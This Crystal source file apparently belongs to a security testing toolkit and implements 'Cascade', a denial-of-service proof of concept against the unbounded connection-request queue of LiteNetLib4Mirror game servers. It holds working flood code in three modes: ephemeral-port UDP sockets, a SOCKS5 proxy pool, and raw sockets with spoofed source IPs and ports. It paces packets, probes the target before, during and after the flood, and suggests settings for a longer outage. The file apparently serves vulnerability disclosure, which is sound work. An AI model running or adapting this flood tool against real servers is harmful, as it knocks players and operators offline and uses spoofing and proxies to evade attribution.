require "../packet"
require "../probe"
require "../raw_udp"
require "../target"
require "socket"
require "atomic"

module Strain
  # CASCADE — Finding P
  #
  # Demonstrates that LiteNetLib4MirrorServer's `_connectionRequests`
  # ConcurrentQueue<ConnectionRequest> has no admission cap. Every UDP packet
  # that LiteNetLib treats as a fresh ConnectRequest from a previously-unseen
  # endpoint inflates two backlogs:
  #
  #   * LiteNetLib._requestsDict (per-IPEndPoint, no cap)        — line 90
  #   * LiteNetLib4MirrorServer._connectionRequests             — line 24
  #
  # CheckIpRateLimit and CheckUserRateLimit run only at dequeue time inside the
  # 30 ms-tick worker (ConnectionRequestLoop, line 124-156), so flood rate has
  # no influence on enqueue admission.
  #
  # Empirical signature: 10 seconds of flood at ~80k pps from one IP yields
  # >= 90 seconds of selective DoS on the ConnectRequest pipeline (other UDP
  # packet classes still respond, including disconnect/PeerNotFound).
  #
  # The "cascade" metaphor: each packet adds another tier to a self-perpetuating
  # backlog the worker can't catch up with.
  module Cascade
    record Config,
      target : Target,
      fibers : Int32,
      duration : Time::Span,
      cool : Time::Span,
      raw_spoof : Bool,
      spoof_base : String,
      spoof_ips : Int32,
      spoof_ports : Int32,
      pps : Int32,
      proxy_pool : Socks5::Pool?

    record Sample,
      t : Float64,
      packets_sent : Int64,
      endpoints : Int64

    record Outcome,
      packets_sent : Int64,
      endpoints : Int64,
      udp_drops_delta : Int64?,
      accepted_estimate : Int64?,
      cold : Probe::Result,
      mid : Probe::Result,
      post0 : Probe::Result,
      post10 : Probe::Result,
      verdict : String,
      reproduced : Bool

    private def self.run_proxy(cfg : Config, pool : Socks5::Pool) : Outcome
      puts "[0] baseline through SOCKS5"
      cold = Probe.shot(cfg.target, proxy_pool: pool)
      puts "    cold pulse:#{cold.rtt_ms.round(1).to_s.rjust(7)} ms  #{cold.label}"

      counter = Atomic(Int64).new(0_i64)
      endpoint_counter = Atomic(Int64).new(0_i64)
      pace_counter = Atomic(Int64).new(0_i64)
      stop = Atomic(Bool).new(false)
      done = Channel(Nil).new(cfg.fibers)

      rate_label = cfg.pps > 0 ? "#{cfg.pps} pps" : "unlimited pps"
      puts "[1] SOCKS5 flood (#{cfg.fibers} fibers, #{cfg.duration.total_seconds.round(1)}s, #{rate_label})"
      flood_started_at = Time.monotonic
      cfg.fibers.times do
        spawn do
          rng = Random.new
          buf = Packet.scratch
          batch = 0
          loop do
            break if stop.get
            begin
              RawUDP.pace_total_rate(pace_counter.add(1_i64), cfg.pps, flood_started_at)
              Packet.mutate!(buf, rng)
              if pool.send_once(cfg.target, buf)
                counter.add(1_i64)
                endpoint_counter.add(1_i64)
              end
            rescue IO::Error | Socket::Error
              # one proxy send skipped
            end
            batch += 1
            Fiber.yield if batch & 0x1f == 0
          end
          done.send(nil)
        end
      end

      samples = [] of Sample
      mid_probe = nil
      t_start = Time.monotonic
      next_tick = t_start
      mid_at = t_start + cfg.duration / 2
      end_at = t_start + cfg.duration
      while Time.monotonic < end_at
        next_tick += 1.second
        sleep_for = next_tick - Time.monotonic
        sleep sleep_for if sleep_for.positive?
        t = (Time.monotonic - t_start).total_seconds
        samples << Sample.new(t, counter.get, endpoint_counter.get)
        printf "  t=%5.1fs  sent~%d  proxy-sessions~%d\n", t, counter.get, endpoint_counter.get
        if mid_probe.nil? && Time.monotonic >= mid_at
          mid_probe = Probe.shot(cfg.target, timeout: 3.seconds, proxy_pool: pool)
          puts "    mid pulse:#{mid_probe.rtt_ms.round(1).to_s.rjust(7)} ms  #{mid_probe.label}"
        end
      end

      stop.set(true)
      cfg.fibers.times { done.receive }
      sent_total = counter.get
      endpoints = endpoint_counter.get
      puts "[2] SOCKS5 flood stopped. sent #{sent_total} packets, #{endpoints} proxy sessions, #{samples.size}s sampled."

      mid_probe ||= Probe.shot(cfg.target, timeout: 3.seconds, proxy_pool: pool)
      post0 = Probe.shot(cfg.target, timeout: 3.seconds, proxy_pool: pool)
      puts "    post t+0:#{post0.rtt_ms.round(1).to_s.rjust(7)} ms  #{post0.label}"
      sleep cfg.cool
      post10 = Probe.shot(cfg.target, timeout: 3.seconds, proxy_pool: pool)
      puts "    post t+#{cfg.cool.total_seconds.to_i}:#{post10.rtt_ms.round(1).to_s.rjust(7)} ms  #{post10.label}"

      verdict, reproduced = classify(cold, mid_probe.not_nil!, post0, post10)
      Outcome.new(sent_total, endpoints, nil, nil, cold, mid_probe.not_nil!, post0, post10, verdict, reproduced)
    ensure
      stop.try &.set(true)
    end

    private def self.run_raw_spoof(cfg : Config) : Outcome
      target_ip = RawUDP.parse_ipv4_u32(cfg.target.host)
      source_base = RawUDP.validate_spoof_range!(cfg.spoof_base, cfg.spoof_ips, cfg.spoof_ports)
      max_endpoints = RawUDP.max_endpoints(cfg.spoof_ips, cfg.spoof_ports)
      packet_size = RawUDP.packet_size(Packet::SIZE)
      sockaddr = RawUDP.sockaddr(target_ip, cfg.target.port)

      probe_raw_fd = RawUDP.open_socket
      LibC.close(probe_raw_fd)

      puts "[0] baseline"
      cold = Probe.shot(cfg.target)
      puts "    cold pulse:#{cold.rtt_ms.round(1).to_s.rjust(7)} ms  #{cold.label}"
      drops_before = RawUDP.udp_drops_for_port(cfg.target.port)

      counter = Atomic(Int64).new(0_i64)
      endpoint_counter = Atomic(Int64).new(0_i64)
      next_endpoint = Atomic(Int64).new(0_i64)
      stop = Atomic(Bool).new(false)
      done = Channel(Nil).new(cfg.fibers)
      rate_label = cfg.pps > 0 ? "#{cfg.pps} pps" : "unlimited pps"

      puts "[1] raw-spoof flood (#{cfg.fibers} fibers, #{cfg.duration.total_seconds.round(1)}s, #{rate_label}, max endpoints #{max_endpoints})"
      flood_started_at = Time.monotonic
      cfg.fibers.times do
        spawn do
          raw_fd = -1
          begin
            raw_fd = RawUDP.open_socket
            rng = Random.new
            payload = Packet.scratch
            packet = Bytes.new(packet_size)
            batch = 0
            loop do
              break if stop.get
              seq = next_endpoint.add(1_i64)
              break if seq >= max_endpoints
              RawUDP.pace_total_rate(seq, cfg.pps, flood_started_at)
              src_ip, src_port = RawUDP.endpoint_at(source_base, cfg.spoof_ports, seq)

              Packet.mutate!(payload, rng)
              RawUDP.build_packet!(
                packet,
                payload,
                src_ip: src_ip,
                dst_ip: target_ip,
                src_port: src_port,
                dst_port: cfg.target.port,
                ident: seq.to_u32
              )

              if RawUDP.send_packet(raw_fd, sockaddr, packet)
                counter.add(1_i64)
                endpoint_counter.add(1_i64)
              end

              batch += 1
              Fiber.yield if batch & 0xff == 0
            end
          rescue ex
            STDERR.puts "    raw-spoof worker stopped: #{ex.message}"
          ensure
            LibC.close(raw_fd) if raw_fd >= 0
            done.send(nil)
          end
        end
      end

      samples = [] of Sample
      mid_probe = nil
      t_start = Time.monotonic
      next_tick = t_start
      mid_at = t_start + cfg.duration / 2
      end_at = t_start + cfg.duration
      while Time.monotonic < end_at
        next_tick += 1.second
        sleep_for = next_tick - Time.monotonic
        sleep sleep_for if sleep_for.positive?
        t = (Time.monotonic - t_start).total_seconds
        samples << Sample.new(t, counter.get, endpoint_counter.get)
        printf "  t=%5.1fs  sent~%d  endpoints~%d\n", t, counter.get, endpoint_counter.get
        if mid_probe.nil? && Time.monotonic >= mid_at
          mid_probe = Probe.shot(cfg.target, timeout: 3.seconds)
          puts "    mid pulse:#{mid_probe.rtt_ms.round(1).to_s.rjust(7)} ms  #{mid_probe.label}"
        end
      end

      stop.set(true)
      cfg.fibers.times { done.receive }
      sent_total = counter.get
      endpoints = endpoint_counter.get
      drops_after = RawUDP.udp_drops_for_port(cfg.target.port)
      drops_delta = if drops_before && drops_after
                      drops_after - drops_before
                    end
      accepted = RawUDP.accepted_estimate(sent_total, drops_delta)
      puts "[2] raw-spoof flood stopped. sent #{sent_total} packets, #{endpoints} endpoints, #{samples.size}s sampled."

      mid_probe ||= Probe.shot(cfg.target, timeout: 3.seconds)
      post0 = Probe.shot(cfg.target, timeout: 3.seconds)
      puts "    post t+0:#{post0.rtt_ms.round(1).to_s.rjust(7)} ms  #{post0.label}"
      sleep cfg.cool
      post10 = Probe.shot(cfg.target, timeout: 3.seconds)
      puts "    post t+#{cfg.cool.total_seconds.to_i}:#{post10.rtt_ms.round(1).to_s.rjust(7)} ms  #{post10.label}"

      verdict, reproduced = classify(cold, mid_probe.not_nil!, post0, post10)
      Outcome.new(sent_total, endpoints, drops_delta, accepted, cold, mid_probe.not_nil!, post0, post10, verdict, reproduced)
    ensure
      stop.try &.set(true)
    end

    def self.run(cfg : Config) : Outcome
      if pool = cfg.proxy_pool
        return run_proxy(cfg, pool)
      end
      return run_raw_spoof(cfg) if cfg.raw_spoof

      puts "[0] baseline"

      cold = Probe.shot(cfg.target)
      puts "    cold pulse:#{cold.rtt_ms.round(1).to_s.rjust(7)} ms  #{cold.label}"

      counter = Atomic(Int64).new(0_i64)
      endpoint_counter = Atomic(Int64).new(0_i64)
      pace_counter = Atomic(Int64).new(0_i64)
      stop = Atomic(Bool).new(false)
      done = Channel(Nil).new(cfg.fibers)

      rate_label = cfg.pps > 0 ? "#{cfg.pps} pps" : "unlimited pps"
      puts "[1] flood (#{cfg.fibers} fibers, #{cfg.duration.total_seconds.round(1)}s, #{rate_label})"
      flood_started_at = Time.monotonic
      cfg.fibers.times do
        spawn do
          rng = Random.new
          buf = Packet.scratch
          dest = Socket::IPAddress.new(cfg.target.host, cfg.target.port)
          batch = 0
          loop do
            break if stop.get
            socket = UDPSocket.new
            begin
              socket.bind("0.0.0.0", 0)
              RawUDP.pace_total_rate(pace_counter.add(1_i64), cfg.pps, flood_started_at)
              Packet.mutate!(buf, rng)
              socket.send(buf, to: dest)
              counter.add(1_i64)
              endpoint_counter.add(1_i64)
            rescue IO::Error
              # one packet skipped
            ensure
              socket.close rescue nil
            end
            batch += 1
            if batch & 0x1f == 0
              Fiber.yield
            end
          end
          done.send(nil)
        end
      end

      samples = [] of Sample
      mid_probe = nil

      t_start = Time.monotonic
      next_tick = t_start
      mid_at = t_start + cfg.duration / 2
      end_at = t_start + cfg.duration
      while Time.monotonic < end_at
        next_tick += 1.second
        sleep_for = next_tick - Time.monotonic
        sleep sleep_for if sleep_for.positive?
        t = (Time.monotonic - t_start).total_seconds
        samples << Sample.new(
          t,
          counter.get,
          endpoint_counter.get,
        )
        printf "  t=%5.1fs  sent~%d\n", t, counter.get
        # Sneak a probe at the midpoint to capture in-flood responsiveness.
        if mid_probe.nil? && Time.monotonic >= mid_at
          mid_probe = Probe.shot(cfg.target, timeout: 3.seconds)
          puts "    mid pulse:#{mid_probe.rtt_ms.round(1).to_s.rjust(7)} ms  #{mid_probe.label}"
        end
      end

      stop.set(true)
      cfg.fibers.times { done.receive }
      sent_total = counter.get
      endpoints = endpoint_counter.get
      puts "[2] flood stopped. sent #{sent_total} packets, #{endpoints} endpoints, #{samples.size}s sampled."

      mid_probe ||= Probe.shot(cfg.target, timeout: 3.seconds)

      post0 = Probe.shot(cfg.target, timeout: 3.seconds)
      puts "    post t+0:#{post0.rtt_ms.round(1).to_s.rjust(7)} ms  #{post0.label}"
      sleep cfg.cool
      post10 = Probe.shot(cfg.target, timeout: 3.seconds)
      puts "    post t+#{cfg.cool.total_seconds.to_i}:#{post10.rtt_ms.round(1).to_s.rjust(7)} ms  #{post10.label}"

      verdict, reproduced = classify(cold, mid_probe.not_nil!, post0, post10)
      Outcome.new(
        sent_total,
        endpoints,
        nil,
        nil,
        cold,
        mid_probe.not_nil!,
        post0,
        post10,
        verdict,
        reproduced,
      )
    end

    private def self.classify(cold : Probe::Result, mid : Probe::Result,
                              post0 : Probe::Result, post10 : Probe::Result) : {String, Bool}
      cold_invalid = cold.reject_code == 0x02_u8
      # "Degraded" = anything other than InvalidToken on a sig-mutated probe.
      # Possible degradation states: silent (queue blocked), NotPermitted
      # (IpRateLimit fired -- which itself shows our own flood drove the rate
      # limit dict), or KickedFromHost (post-sig validation degraded).
      mid_degraded = !(mid.reject_code == 0x02_u8)
      post10_degraded = !(post10.reject_code == 0x02_u8)
      post10_silent = post10.label.starts_with?("silent")

      if cold_invalid && post10_silent
        msg = String.build do |s|
          s << "Cascade REPRODUCED: ConnectRequest pipeline silenced after flood drains.\n"
          s << "  cold pulse  -> #{cold.label} (baseline: Stage-1 verify ran)\n"
          s << "  mid pulse   -> #{mid.label} (during flood)\n"
          s << "  post t+0    -> #{post0.label} (immediately after flood)\n"
          s << "  post drained-> silent (queue depth still blocking new joins)\n"
          s << "  Selective DoS: other UDP classes (disconnect/PeerNotFound) still answer."
        end
        {msg, true}
      elsif cold_invalid && (mid_degraded || post10_degraded)
        msg = String.build do |s|
          s << "Cascade PARTIAL: pipeline degraded under flood but recovered.\n"
          s << "  cold pulse  -> #{cold.label} (baseline)\n"
          s << "  mid pulse   -> #{mid.label}\n"
          s << "  post t+0    -> #{post0.label}\n"
          s << "  post drained-> #{post10.label} (recovered)\n"
          s << "  Try --fibers 400 --duration 30 for full silence reproduction."
        end
        {msg, true}
      else
        {"Cascade not reproduced: try --fibers 400 --duration 30, ensure server is online_mode=true.", false}
      end
    end
  end
end
